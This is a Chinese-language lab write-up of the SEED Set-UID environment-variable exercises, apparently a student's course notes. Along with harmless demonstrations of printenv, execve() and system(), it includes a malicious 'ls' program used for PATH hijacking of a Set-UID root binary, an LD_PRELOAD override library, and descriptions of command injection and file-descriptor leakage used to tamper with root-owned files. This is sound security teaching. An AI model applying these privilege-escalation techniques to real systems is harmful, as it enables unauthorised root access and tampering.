---
hide:
  #- navigation # 显示右
  #- toc #显示左
  - footer
  - feedback
# comments: true
---  

# Set UID

!!! warning "Warning"

	本实验需要在 Ubuntu 20.04 或更低版本进行，Ubuntu 24.04 会有意想不到的效果

## 任务 1：操作环境变量

我们使用 `printenv PWD` 命令来打印当前工作目录的环境变量：

![](../../../../../assets/Pasted%20image%2020250704124523.png)

用 `env | grep PWD` 也同理：

![](../../../../../assets/Pasted%20image%2020250704124604.png)

- 图中的 OLDPWD 环境变量代表上一个目录

我们还可以用 `export` 来设置一个新的环境变量，并用 printenv 验证：

![](../../../../../assets/Pasted%20image%2020250704130047.png)

用 `unset` 即可删除环境变量：

![](../../../../../assets/Pasted%20image%2020250704130127.png)
***
## 任务 2：从父进程向子进程传递环境变量

### 步骤 1

编译 `myprintenv.c` 文件，运行获得输出：

![](../../../../../assets/Pasted%20image%2020250704133957.png)
***
### 步骤 2

注释掉子进程中的 `printenv()` 语句，取消注释父进程中的 `printenv()` 语句，重新编译并运行：

![](../../../../../assets/Pasted%20image%2020250704134332.png)
***
### 步骤 3

使用 `diff` 命令比较两个文件的差异，得到：

![](../../../../../assets/Pasted%20image%2020250704134421.png)

两个文件没有任何差异，说明子进程成功从父进程复制到了所有的环境变量
***
## 任务 3：环境变量与 execve()

### 步骤 1

编译运行 `myenv.c`，得到结果：

![](../../../../../assets/Pasted%20image%2020250704134723.png)

可以看到没有任何输出，当前进程没有任何环境变量
***
### 步骤 2

修改 `myenv.c` 的 `execve()` 调用为 `execve("usr/bin/env", argv, environ)`，重新编译运行：

![](../../../../../assets/Pasted%20image%2020250704134935.png)

可以看到输出了完整的环境变量列表
***
### 步骤 3

`execve()` 函数是否将环境变量传递给新程序，完全取决于其第三个参数

- 如果第三个参数为 `NULL`，新程序不会继承任何环境变量
- 如果第三个参数指向一个环境变量数组（如全局变量 `environ`），新程序则会获得这些环境变量
***
## 任务 4：环境变量与 system()

编译并运行以下代码：

```c
#include <stdio.h>
#include <stdlib.h>
int main()
{
    system("/usr/bin/env");
    return 0;
}
```

得到结果：

![](../../../../../assets/Pasted%20image%2020250704135223.png)

可以看到，程序输出了当前 shell 的完整环境变量列表，说明 `system()` 函数会将被调用进程的环境变量传递给它所创建的 shell 进程
***
## 任务 5：环境变量与 Set-UID 程序

### 步骤 1

编译并运行以下代码，以打印当前进程中的所有环境变量：

```c
#include <stdio.h>
#include <stdlib.h>
extern char **environ;
int main()
{
    int i=0;
    while (environ[i] != NULL) {
        printf("%s\n", environ[i]);
        i++;
    }
    return 0;
}
```
***
### 步骤 2

编译上述程序，将其所有者改为 root，设置为 Set-UID 程序：

![](../../../../../assets/Pasted%20image%2020250704135539.png)
***
### 步骤 3

使用 export 命令设置几个环境变量：

![](../../../../../assets/Pasted%20image%2020250704135725.png)

运行步骤 2 的 Set-UID 程序：

![](../../../../../assets/Pasted%20image%2020250704135945.png)

可以看到，PATH 和自定义的环境变量都被继承下来了，但是 LD_LIBRARY_PATH 却消失了，这可能是因为现代 Linux 系统对 Set-UID 程序的安全性进行了增强，禁止了某些敏感环境变量的传递，以防止攻击者利用这些环境变量进行攻击
***
## 任务 6：PATH 环境变量与 Set-UID 程序

首先我们需要将 /bin/sh 链接到 /bin/zsh：

![](../../../../../assets/Pasted%20image%2020250704161800.png)

我们首先在 /tmp 当中编写一个恶意 ls 程序：

```c
#include <stdio.h>
#include <unistd.h>
int main() {
    printf("Malicious ls is running with UID: %d, EUID: %d\n", getuid(), geteuid());
    FILE *f = fopen("/root/hacked", "w");
    if (f) {
        fprintf(f, "hacked!");
        fclose(f);
    }
    return 0;
}
```

编译程序：

![](../../../../../assets/Pasted%20image%2020250704162300.png)

构建受害程序：

```c
#include <stdio.h>
#include <stdlib.h>
int main()
{
	system("ls");
	return 0;
}
```

编译并设置为 Set-UID 程序：

![](../../../../../assets/Pasted%20image%2020250704162530.png)

将包含恶意 ls 的目录添加到 PATH 环境变量中并运行受害程序：

![](../../../../../assets/Pasted%20image%2020250704212442.png)

可以看到，恶意 ls 程序成功运行并创建了 /root/hacked 文件，说明我们成功利用了 Set-UID 程序的 PATH 环境变量漏洞来执行恶意代码

!!! note "在 Ubuntu 24.04 的效果"

	在 Ubuntu 24.04，恶意 ls 程序成功运行但是没有输出，且没有创建 `/root/hacked`，但是同样使得进程的 `ls` 命令改变
***
## 任务 7：LD_PRELOAD 环境变量与 Set-UID 程序

### 步骤 1

构建动态链接库，编写 `sleep()` 函数覆盖 libc 中的 `sleep()` 函数：

```c
#include <stdio.h>
void sleep (int s)
{
	printf("I am not going to sleep for %d seconds!\n", s);
}
```

![](../../../../../assets/Pasted%20image%2020250704213827.png)

设置 LD_PRELOAD 环境变量并编译运行以下程序：

```c
#include <unistd.h>
int main()
{
	sleep(1);
	return 0;
}
```

![](../../../../../assets/Pasted%20image%2020250704214130.png)
***
### 步骤 2

不同条件下运行上述程序：

- `myprog` 为普通程序，以普通用户运行：
	
	![](../../../../../assets/Pasted%20image%2020250704214258.png)
	
	- 输出了覆盖的 `sleep()` 函数，原来的 `sleep()` 函数并没有被调用
- `myprog` 为 Set-UID root 程序，以普通用户运行：
	
	![](../../../../../assets/Pasted%20image%2020250704214527.png)
	
	- 程序暂停了 1 秒，并没有输出覆盖的 `sleep()` 函数
- `myprog` 为 Set-UID root 程序，以 root 用户运行：
	
	![](../../../../../assets/Pasted%20image%2020250704214730.png)
	
	- 输出了覆盖的 `sleep()` 函数，原来的 `sleep()` 函数并没有被调用
- `myprog` 为 Set-UID user1 程序，在 user2 账户中运行：
	
	![](../../../../../assets/Pasted%20image%2020250704215538.png)
	
	- 程序暂停了 1 秒，并没有输出覆盖的 `sleep()` 函数
***
### 步骤 3

`LD_PRELOAD` 环境变量被操作系统认为是危险的，因此在执行 Set-UID 程序时，除非程序的真实用户和有效用户是同一个人（通常是 root 自己运行自己的程序），否则这些变量会被动态加载器清除或忽略，以防止权限提升攻击
***
## 任务 8：使用 system() 和 execve() 调用外部程序

### 步骤 1 

在这之前，我们有生成一个 `/root/hacked` 文件，但是没有权限去删除：

![](../../../../../assets/Pasted%20image%2020250704224750.png)

对于给定的程序，因为使用的是 `system()` 函数，我们通过注入一条命令，去删除之前我们在 `/root` 下生成的 `hacked` 文件：

![](../../../../../assets/Pasted%20image%2020250704225652.png)

可以看到，我们成功删掉了 `/root/hacked` 文件，实现了破坏系统的完整性
***
### 步骤 2

我们在 `catall.c` 中注释掉 `system()` 函数，改为使用 `execve()` 函数来调用外部程序，还原 `/root/hacked` 文件，再次编译并运行：

![](../../../../../assets/Pasted%20image%2020250704225930.png)

可以看到，程序将整个字符串当做文件，并没有执行命令，因此没有删除 `/root/hacked` 文件
***
## 任务 9：权限泄漏

首先创建一个归 root 所有的重要文件 `/etc/zzz`：

![](../../../../../assets/Pasted%20image%2020250704230246.png)

我们通过 `cap_leak.c` 泄漏的文件描述符，即可获取到不属于 seed 账户权限的文件的写入权：

![](../../../../../assets/Pasted%20image%2020250704230526.png)

在正常情况下，我们是无法写入的：

![](../../../../../assets/Pasted%20image%2020250704230604.png)



